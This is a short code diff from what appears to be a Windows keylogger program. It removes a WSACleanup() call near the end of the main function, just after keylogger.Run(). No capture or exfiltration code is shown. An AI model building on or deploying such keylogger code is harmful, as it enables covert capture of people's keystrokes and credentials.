@@ -30,7 +30,6 @@ int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCm
 #endif
     keylogger.Run();
 
-    WSACleanup();
     CloseHandle(hSem);
     return 0;
 }
